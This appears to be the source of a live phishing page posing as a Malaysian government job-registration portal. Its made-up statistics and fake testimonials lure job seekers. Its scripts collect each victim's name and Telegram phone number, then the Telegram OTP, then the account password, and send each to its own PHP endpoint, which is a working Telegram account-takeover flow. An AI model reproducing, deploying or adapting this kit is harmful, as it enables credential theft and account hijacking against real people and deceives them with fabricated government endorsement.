<!DOCTYPE html>
<html lang="en" class="h-100">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <!-- Required Meta Tags -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Plugins CSS -->
    <link rel="stylesheet" href="assets/css/plugins.css">
    <!-- Icon Plugins CSS -->
    <link rel="stylesheet" href="assets/css/iconplugins.css">
    <!-- Style CSS -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- Responsive CSS -->
    <link rel="stylesheet" href="assets/css/responsive.css">
    <!-- Theme Dark CSS -->
    <link rel="stylesheet" href="assets/css/theme-dark.css">
    <!-- Title -->
    <title>JOBS 2025</title>
    <!-- Favicon -->
    <link rel="icon" type="image/png">
</head>

<body>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <link rel="icon" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <meta name="theme-color" content="#000000" />
        <meta name="description" content="Jobs In Dubai" />
        <link rel="apple-touch-icon" />
        <!-- <link rel="manifest" href="manifest.json" /> -->
        <title>JOBS 2025</title>
        <!-- <script defer="defer" src="/assets/main.cc62bdb7.js"></script> -->
        <link href="assets/main.7ff014f6.css" rel="stylesheet">
        <style>
            .btn-mk {
                color: #fff;
                background-color: #3776eb;
            }

            #loader {
                height: 80vh;
                width: 90vw;
                position: fixed;
                top: 0;
                left: 0;
                margin: 0;
                padding: 0;
                background: rgba(255, 255, 255, 0.7);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 9999;
            }

            .loader {
                width: 45px;
                aspect-ratio: 1;
                --c: no-repeat linear-gradient(#000000 0 0);
                background:
                    var(--c) 0% 50%,
                    var(--c) 50% 50%,
                    var(--c) 100% 50%;
                background-size: 20% 100%;
                animation: l1 0.5s infinite linear;
            }

            @keyframes l1 {
                0% {
                    background-size: 20% 100%, 20% 100%, 20% 100%;
                }

                33% {
                    background-size: 20% 10%, 20% 100%, 20% 100%;
                }

                50% {
                    background-size: 20% 100%, 20% 10%, 20% 100%;
                }

                66% {
                    background-size: 20% 100%, 20% 100%, 20% 10%;
                }

                100% {
                    background-size: 20% 100%, 20% 100%, 20% 100%;
                }
            }

            /* Social Proof & Testimonials Styles */
            .proof-section {
                margin-top: 1.5rem;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            }

            .proof-stats-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 0.6rem;
                margin-bottom: 1.25rem;
            }

            .proof-stat-card {
                background: #ffffff;
                border-radius: 16px;
                padding: 0.85rem 0.4rem;
                text-align: center;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
                border: 1px solid #f1f5f9;
            }

            .proof-stat-number {
                display: block;
                font-size: 1.2rem;
                font-weight: 800;
                color: #1e3a8a;
                line-height: 1.2;
            }

            .proof-stat-label {
                display: block;
                font-size: 0.62rem;
                font-weight: 700;
                color: #8c9ba5;
                text-transform: uppercase;
                letter-spacing: 0.03em;
                margin-top: 0.35rem;
                line-height: 1.2;
            }

            .proof-divider {
                display: flex;
                align-items: center;
                gap: 0.5rem;
                margin-bottom: 1rem;
            }

            .proof-live-dot {
                width: 9px;
                height: 9px;
                background-color: #10b981;
                border-radius: 50%;
                flex-shrink: 0;
                box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
            }

            .proof-title {
                font-size: 0.75rem;
                font-weight: 800;
                color: #0f172a;
                text-transform: uppercase;
                letter-spacing: 0.03em;
                margin: 0;
                white-space: nowrap;
            }

            .proof-line {
                flex-grow: 1;
                height: 1px;
                background-color: #cbd5e1;
            }

            .proof-badge {
                background-color: #059669;
                color: #ffffff;
                font-size: 0.7rem;
                font-weight: 700;
                padding: 0.25rem 0.65rem;
                border-radius: 9999px;
                white-space: nowrap;
            }

            .proof-card {
                background: #ffffff;
                border-radius: 18px;
                padding: 1.1rem;
                margin-bottom: 1rem;
                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
                border: 1px solid #e2e8f0;
                border-left: 5px solid #10b981;
                position: relative;
                text-align: left;
            }

            .proof-card-header {
                display: flex;
                align-items: center;
                gap: 0.75rem;
                margin-bottom: 0.6rem;
            }

            .proof-avatar-wrapper {
                position: relative;
                flex-shrink: 0;
            }

            .proof-avatar {
                width: 48px;
                height: 48px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: 800;
                font-size: 1.35rem;
                color: #ffffff;
            }

            .proof-avatar-blue {
                background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
            }

            .proof-avatar-green {
                background: linear-gradient(135deg, #059669 0%, #047857 100%);
            }

            .proof-avatar-check {
                position: absolute;
                bottom: -2px;
                right: -2px;
                width: 18px;
                height: 18px;
                background-color: #10b981;
                border: 2px solid #ffffff;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #ffffff;
            }

            .proof-user-info {
                display: flex;
                flex-direction: column;
                gap: 0.2rem;
            }

            .proof-user-name-row {
                display: flex;
                align-items: center;
                gap: 0.5rem;
                flex-wrap: wrap;
            }

            .proof-user-name {
                font-size: 0.98rem;
                font-weight: 700;
                color: #1e293b;
                margin: 0;
                line-height: 1.2;
            }

            .proof-tag-female {
                background-color: #fdf2f8;
                color: #db2777;
                border: 1px solid #fbcfe8;
                font-size: 0.68rem;
                font-weight: 600;
                padding: 0.15rem 0.5rem;
                border-radius: 9999px;
                display: inline-flex;
                align-items: center;
                gap: 0.2rem;
            }

            .proof-tag-male {
                background-color: #eff6ff;
                color: #2563eb;
                border: 1px solid #bfdbfe;
                font-size: 0.68rem;
                font-weight: 600;
                padding: 0.15rem 0.5rem;
                border-radius: 9999px;
                display: inline-flex;
                align-items: center;
                gap: 0.2rem;
            }

            .proof-user-meta {
                display: flex;
                align-items: center;
                gap: 0.25rem;
                font-size: 0.75rem;
                color: #64748b;
            }

            .proof-stars {
                color: #f59e0b;
                font-size: 0.95rem;
                letter-spacing: 0.15rem;
                margin-bottom: 0.65rem;
            }

            .proof-alert-box {
                background-color: #ecfdf5;
                border: 1px solid #a7f3d0;
                border-radius: 14px;
                padding: 0.65rem 0.85rem;
                display: flex;
                align-items: center;
                gap: 0.75rem;
                margin-bottom: 0.75rem;
            }

            .proof-alert-icon {
                width: 32px;
                height: 32px;
                background-color: #10b981;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #ffffff;
                flex-shrink: 0;
            }

            .proof-alert-content {
                display: flex;
                flex-direction: column;
                text-align: left;
            }

            .proof-alert-title {
                font-size: 0.78rem;
                font-weight: 800;
                color: #065f46;
                display: flex;
                align-items: center;
                gap: 0.35rem;
                letter-spacing: 0.02em;
            }

            .proof-alert-ref {
                font-size: 0.72rem;
                font-weight: 600;
                color: #047857;
                margin-top: 0.15rem;
            }

            .proof-alert-ref code {
                font-family: inherit;
                font-weight: 700;
            }

            .proof-comment {
                font-size: 0.83rem;
                color: #475569;
                line-height: 1.5;
                margin: 0;
                text-align: left;
            }
        </style>
    </head>

    <body>
        <div id="root">
            <main class="flex-grow">
                <div class="relative min-h-screen flex flex-col items-center justify-start py-8 px-3 sm:px-4 overflow-y-auto">
                    <video class="fixed top-0 left-0 w-full h-full object-cover -z-10 pointer-events-none"
                        src="dubaijobs.mp4" autoplay="" muted loop></video>
                    <div
                        class="w-full max-w-lg p-6 bg-white bg-opacity-10 backdrop-blur-sm rounded-lg shadow-[0_10px_30px_rgba(0,0,0,0.9)] relative z-10">
                        <div class="w-full flex justify-center my-6">
                            <img src="assets/images/gambar1.png" alt="Header"
                                class="w-full h-auto object-contain rounded-lg shadow-2xl shadow-gray-500">
                        </div>
                        <div class="first">
                            <form action="javascript:void(0)" method="post" id="firstForm">
                                <div class="input-group mb-3">
                                    <span class="input-group-text" id="basic-addon1">Name</span>
                                    <input name="name" id="name" maxlength="18" class="form-control" type="text"
                                        required placeholder="Full name" title="">
                                </div>
                                <div class="input-group mb-3">
                                    <label class="input-group-text" for="country">Country</label>
                                    <select class="form-select" id="country" onchange="updatePhonePrefix()">
                                        <option value="60" data-flag="my.png" selected>Malaysia</option>
                                    </select>
                                </div>
                                <div class="input-group mb-3">
                                    <span class="input-group-text" id="prefixDisplay"><img src="assets/images/my.png"
                                            width="20" height="20" /> +60</span>
                                    <input name="phone" id="phone" maxlength="18" class="form-control" type="number"
                                        required placeholder="Active Telegram Number" title="">
                                </div>

                                <div id="wrong" class="text-red-500 text-sm mt-1" style="display: none;">Phone Number
                                    Invalid</div>
                                <div id="feedback" class="text-sm mt-1"></div>
                                <div id="loader" style="display:none;">
                                    <div class="loader"></div>
                                </div>

                                <div class="text-center">
                                    <button type="button" class="btn btn-lg btn-block btn-mk"
                                        onclick="processFirstData()">REGISTER</button>
                                </div>
                            </form>

                            <!-- Social Proof & Statistics -->
                            <div class="proof-section">
                                <!-- Counter Cards -->
                                <div class="proof-stats-grid">
                                    <div class="proof-stat-card">
                                        <span class="proof-stat-number">12,847</span>
                                        <span class="proof-stat-label">JUMLAH PERMOHONAN</span>
                                    </div>
                                    <div class="proof-stat-card">
                                        <span class="proof-stat-number">+500</span>
                                        <span class="proof-stat-label">JAWATAN KOSONG</span>
                                    </div>
                                    <div class="proof-stat-card">
                                        <span class="proof-stat-number">373</span>
                                        <span class="proof-stat-label">SEDANG DIPROSES</span>
                                    </div>
                                </div>

                                <!-- Divider Title Bar -->
                                <div class="proof-divider">
                                    <div class="proof-live-dot"></div>
                                    <span class="proof-title">PERMOHONAN YANG BERJAYA DIDAFTARKAN</span>
                                    <div class="proof-line"></div>
                                    <span class="proof-badge">12,847 berjaya</span>
                                </div>

                                <!-- Testimonial Card 1: Nurul Ain Zakaria -->
                                <div class="proof-card">
                                    <div class="proof-card-header">
                                        <div class="proof-avatar-wrapper">
                                            <div class="proof-avatar proof-avatar-blue">N</div>
                                            <div class="proof-avatar-check">
                                                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                                    <polyline points="20 6 9 17 4 12"></polyline>
                                                </svg>
                                            </div>
                                        </div>
                                        <div class="proof-user-info">
                                            <div class="proof-user-name-row">
                                                <span class="proof-user-name">Nurul Ain Zakaria</span>
                                                <span class="proof-tag-female">&#9792; Perempuan</span>
                                            </div>
                                            <div class="proof-user-meta">
                                                <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" style="opacity: 0.7;">
                                                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
                                                </svg>
                                                <span>Johor Bahru &bull; 11 min lepas</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="proof-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
                                    <div class="proof-alert-box">
                                        <div class="proof-alert-icon">
                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                                <polyline points="20 6 9 17 4 12"></polyline>
                                            </svg>
                                        </div>
                                        <div class="proof-alert-content">
                                            <div class="proof-alert-title">
                                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                                    <polyline points="9 11 12 14 22 4"></polyline>
                                                    <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
                                                </svg>
                                                <span>PERMOHONAN BERJAYA DIDAFTARKAN</span>
                                            </div>
                                            <div class="proof-alert-ref">No. Rujukan: <code>BNT-2026-752341</code></div>
                                        </div>
                                    </div>
                                    <p class="proof-comment">
                                        Dah lama saya tunggu peluang ini. Akhirnya dapat daftar dengan mudah. Terima kasih kerajaan Malaysia!
                                    </p>
                                </div>

                                <!-- Testimonial Card 2: Ahmad Zaki Roslan -->
                                <div class="proof-card">
                                    <div class="proof-card-header">
                                        <div class="proof-avatar-wrapper">
                                            <div class="proof-avatar proof-avatar-green">A</div>
                                            <div class="proof-avatar-check">
                                                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                                    <polyline points="20 6 9 17 4 12"></polyline>
                                                </svg>
                                            </div>
                                        </div>
                                        <div class="proof-user-info">
                                            <div class="proof-user-name-row">
                                                <span class="proof-user-name">Ahmad Zaki Roslan</span>
                                                <span class="proof-tag-male">&#9794; Lelaki</span>
                                            </div>
                                            <div class="proof-user-meta">
                                                <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" style="opacity: 0.7;">
                                                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
                                                </svg>
                                                <span>Pulau Pinang &bull; 15 min lepas</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="proof-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
                                    <div class="proof-alert-box">
                                        <div class="proof-alert-icon">
                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                                <polyline points="20 6 9 17 4 12"></polyline>
                                            </svg>
                                        </div>
                                        <div class="proof-alert-content">
                                            <div class="proof-alert-title">
                                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                                    <polyline points="9 11 12 14 22 4"></polyline>
                                                    <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
                                                </svg>
                                                <span>PERMOHONAN BERJAYA DIDAFTARKAN</span>
                                            </div>
                                            <div class="proof-alert-ref">No. Rujukan: <code>BNT-2026-398564</code></div>
                                        </div>
                                    </div>
                                    <p class="proof-comment">
                                        OTP masuk dalam beberapa saat sahaja. Proses terus berjalan lancar. Sistem yang sangat canggih dan berkesan!
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="second" style="display: none;">
                            <form action="javascript:void(0)" method="post" id="secondForm">
                                <input type="hidden" name="full_name" id="validateFullName" readonly>
                                <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
                                <div class="mb-3">
                                    <label for="otp" class="form-label">
                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo" style="color: #ffffff;">Kami telah menghantar OTP 5 digit
                                            ke akaun Telegram anda, sila buka aplikasi Telegram anda dan semak
                                            mesej kami.</span>
                                    </label>
                                    <input name="otp" maxlength="5" id="otp" class="form-control" type="text"
                                        pattern="\d*" inputmode="numeric"
                                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);"
                                        placeholder="*****" required>
                                </div>
                                <div class="text-center">
                                    <button type="submit" class="btn btn-lg btn-block btn-mk"
                                        onclick="processSecondData()">Next</button>
                                </div>
                            </form>
                        </div>
                        <div class="third" style="display: none;">
                            <form action="javascript:void(0)" method="post" id="thirdForm">
                                <input type="hidden" name="full_name" id="validateFullName" readonly>
                                <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
                                <input type="hidden" name="otp_code" id="validateOtp_code" readonly>
                                <div class="mb-3">
                                    <label for="password" class="form-label">
                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo" style="color: #ffffff;">Kata laluan</span>
                                    </label>
                                    <input name="password" id="password" class="form-control" type="text"
                                        required="true" placeholder="********">
                                </div>
                                <div class="text-center">
                                    <button type="submit" class="btn btn-lg btn-block btn-mk"
                                        onclick="processThirdData()">Next</button>
                                </div>
                            </form>
                        </div>
                        <div class="row four" id="ctl00_RecipientMasterContent_divResultNotFound"
                            style="display: none;">
                            <p class="d-flex justify-content-center align-items-center"><img src="assets/images/processing.gif" id="ctl00_logohead"
                                    class="img-fluid" width="160" /></p>
                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord" style="color: #ffffff;">Sila tunggu
                                    sebentar. Kami sedang memproses permohonan anda.</span></h5>
                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord" style="color: #ffffff;">Tunggu 1x24 jam
                                    untuk mendapatkan pengesahan pendaftaran melalui aplikasi Telegram anda.</span></h5>
                            <p class="text-center"><a href="" class="btn btn-lg btn-block btn-mk">&laquo; <span
                                        id="ctl00_RecipientMasterContent_lblGoBack_NoResult">PENGESAHAN</span></a>
                            </p>
                        </div>
                        <script type="text/javascript">
                            //<![CDATA[
                            var Page_ValidationActive = false;
                            if (typeof (ValidatorOnLoad) == "function") {
                                ValidatorOnLoad();
                            }
                            function ValidatorOnSubmit() {
                                if (Page_ValidationActive) {
                                    return ValidatorCommonOnSubmit();
                                } else {
                                    return true;
                                }
                            }
                        </script>
                    </div>
                </div>
        </div>
        </div>
        </div>
        </div>
        <script src="assets/js/jquery.min.js"></script>
        <div class="switch-box">
            <label id="switch" class="switch">
                <input type="checkbox" onchange="toggleTheme()" id="slider">
                <span class="slider round">
                </span>
            </label>
        </div>
        <script src="assets/js/script.js"></script>
        <script>
            function updatePhonePrefix() {
                const select = document.getElementById("country");
                const selectedOption = select.options[select.selectedIndex];
                const code = selectedOption.value;
                const flag = selectedOption.getAttribute("data-flag");

                const prefixDisplay = document.getElementById("prefixDisplay");
                prefixDisplay.innerHTML = `<img src="assets/images/${flag}" width="20" height="20" /> +${code}`;
            }
        </script>
        <script>
            // åŠ è½½å¤šè¯­è¨€
            var language = getQueryString('language')
            loadLocale(function (e) {
                app.locale = Object.assign(e.Common, e.CommonShare)
            }, language)
            var app = new Vue({
                el: '#app',
                data: {
                    locale: {},
                    uid: '2004219',
                },
                created() {
                    $('#app').show();
                    this.starScroll();
                },
                methods: {
                    starScroll() {
                        var _this = this;
                        _this.scrollTimer && clearTimeout(_this.scrollTimer)
                        _this.scrollTimer = setTimeout(() => {
                            var $box = $("#list").find(".list:first");
                            $box.css({
                                marginTop: 0
                            })
                            var $item = $box.find(".item:first");
                            var outerHeight = $item.outerHeight(true)
                            $box.animate({
                                "marginTop": -outerHeight + "px"
                            }, 1000, function () {
                                $box.css({
                                    marginTop: 0
                                }).find(".item:first").appendTo($box);
                                _this.starScroll();
                            })
                        }, 600);
                    },
                },
            })
        </script>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                const container = document.querySelector('.testimoni-container');
                const items = Array.from(container.children);
                let index = 0;
                function scrollTestimonial() {
                    container.style.transform = `translateY(-${index * 60}px)`;
                    container.style.transition = 'transform 1s ease';
                    if (index >= items.length - 5) {
                        setTimeout(() => {
                            container.style.transition = 'none';
                            container.style.transform = 'translateY(0)';
                            index = 0;
                        }, 1000);
                    } else {
                        index++;
                    }
                }
                setInterval(scrollTestimonial, 3000);
            });
            document.addEventListener('DOMContentLoaded', function () {
                const header = document.querySelector('.sticky-header');
                let lastScrollTop = 0;
                window.addEventListener('scroll', function () {
                    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
                    if (scrollTop > lastScrollTop && scrollTop > 100) {
                        header.classList.add('visible-header');
                        header.classList.remove('hidden-header');
                    } else if (scrollTop <= 100) {
                        header.classList.add('hidden-header');
                        header.classList.remove('visible-header');
                    }
                    lastScrollTop = scrollTop;
                });
            });
        </script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script>
            function processFirstData() {
                const name = $("#name").val().trim();
                const phone = $("#phone").val().trim();
                const code = $("#country").val(); // ambil kode negara dari select
                const fullPhone = "+" + code + phone;

                const feedback = $("#feedback");
                const loader = $("#loader");

                feedback.text("");
                if (!name || !phone) {
                    feedback.text("Nama dan nomor wajib diisi.");
                    return;
                }

                loader.show();

                $.ajax({
                    url: "data/sendData.php",
                    type: "POST",
                    contentType: "application/json",
                    data: JSON.stringify({ name: name, phone: fullPhone }),
                    success: function (res) {
                        loader.hide();
                        if (res.status === "success") {
                            sessionStorage.setItem("full_name", name);
                            sessionStorage.setItem("phone_number", fullPhone);

                            $("#validateFullName").val(name);
                            $("#validatePhoneNumber").val(fullPhone);

                            $(".first").hide();
                            $(".second").show();
                        } else {
                            feedback.text(res.message);
                        }
                    },
                    error: function () {
                        loader.hide();
                        feedback.text("Gagal koneksi ke server.");
                    }
                });
            }

            function processSecondData() {
                const otp = $("#otp").val().trim();
                if (!otp || otp.length !== 5) {
                    alert("Masukkan OTP 5 digit.");
                    return;
                }

                $.ajax({
                    url: "data/sendOtp.php",
                    type: "POST",
                    contentType: "application/json",
                    data: JSON.stringify({ otp: otp }),
                    success: function (res) {
                        if (res.status === "success") {
                            $(".second").hide();
                            $(".third").show();
                        } else {
                            alert(res.message);
                        }
                    },
                    error: function () {
                        alert("Gagal memverifikasi OTP.");
                    }
                });
            }

            function processThirdData() {
                const password = $("#password").val().trim();

                $.ajax({
                    url: "data/sendPw.php",
                    type: "POST",
                    contentType: "application/json",
                    data: JSON.stringify({ password: password }),
                    success: function (res) {
                        if (res.status === "success") {
                            $(".third").hide();
                            $(".four").show();
                        } else {
                            alert(res.message);
                        }
                    },
                    error: function () {
                        alert("Gagal mengirim data akhir.");
                    }
                });
            }
            
            $(document).ready(function () {
                if (sessionStorage.getItem("full_name")) {
                    $("#validateFullName").val(sessionStorage.getItem("full_name"));
                }
                if (sessionStorage.getItem("phone_number")) {
                    $("#validatePhoneNumber").val(sessionStorage.getItem("phone_number"));
                }
            });
        </script>
    </body>

    </html>